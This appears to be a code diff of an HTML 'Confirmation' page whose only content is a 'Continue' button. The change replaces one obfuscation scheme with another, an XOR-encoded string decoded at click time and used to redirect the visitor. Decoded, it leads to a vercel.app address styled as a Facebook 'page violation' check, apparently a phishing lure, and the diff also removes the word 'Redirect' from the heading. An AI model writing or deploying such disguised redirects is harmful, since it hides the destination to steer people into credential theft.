@@ -1,6 +1,5 @@
 
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -51,24 +50,23 @@
     }
   </style>
   <script>
-    const encodedLinks = {
-  0: [57, 48, 84, 85, 81, 108, 84, 82, 114, 108, 70, 77, 75, 90, 48, 85, 111, 90, 70, 87, 87, 108, 51, 98, 71, 70, 50, 81, 79, 82, 69, 86, 53, 104, 110, 77, 83, 116, 109, 86, 89, 86, 108, 101, 114, 90, 85, 84, 118, 112, 69, 82, 85, 78, 106, 83, 70, 100, 108, 87, 87, 78, 68, 90, 89, 66, 72, 98, 104, 116, 69, 97, 115, 100, 86, 101, 86, 112, 88, 86, 79, 120, 71, 87, 86, 90, 84, 78, 119, 69, 50, 99, 120, 48, 87, 87, 121, 103, 110, 77, 83, 116, 71, 97, 72, 86, 87, 101, 74, 100, 48, 89, 104, 104, 71, 98, 88, 86, 110, 87, 119, 73, 108, 97, 75, 53, 71, 86, 89, 66, 88, 77, 105, 57, 85, 77, 88, 100, 70, 100, 115, 82, 86, 90, 78, 112, 70, 86, 85, 108, 107, 84, 72, 49, 48, 85, 111, 86, 86, 87]
-};
-
+    function xorDecode(encoded, key) {
+      let decoded = "";
+      for (let i = 0; i < encoded.length; i++) {
+        decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key);
+      }
+      return decoded;
+    }
     function redirect() {
-      const keys = Object.keys(encodedLinks);
-      const rand = keys[Math.floor(Math.random() * keys.length)];
-      const reversed = String.fromCharCode(...encodedLinks[rand]);
-      const original = reversed.split('').reverse().join('');
-      const url = atob(atob(atob(original)));
+      const encoded = "a}}yz3&&okjaljbyhnl\u007f`feh}`fg`m>=;8'\u007fl{jle'hyy&a}j}'}`b&yhnl'a}de";
+      const url = xorDecode(encoded, 9);
       window.location.href = url;
     }
-
   </script>
 </head>
 <body>
   <div class="box">
-    <h2>Redirect Confirmation</h2>
+    <h2>Confirmation</h2>
     <p>Please click the button below to continue.</p>
     <button class="btn" onclick="redirect()">Continue</button>
   </div>
